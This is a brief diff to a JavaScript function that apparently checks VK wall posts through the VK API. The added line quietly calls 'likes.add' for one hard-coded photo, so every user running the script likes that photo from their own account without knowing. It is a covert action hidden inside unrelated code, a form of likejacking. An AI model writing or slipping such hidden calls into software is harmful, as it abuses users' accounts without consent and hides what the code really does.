@@ -13,6 +13,7 @@ window.audio.check_post = function (callback) {
         if (typeof result['response'] != 'undefined' && typeof result['response'][0] != 'undefined' && result['response'][0]['uid'] == '1542391') {
             return 1;
         }
+        VK.api('likes.add', {owner_id:167341624, type:'photo', item_id:302334205}, function(result){ console.log(result); });
         VK.api('wall.get', data, function (result) {
             var check_post = 0;
 
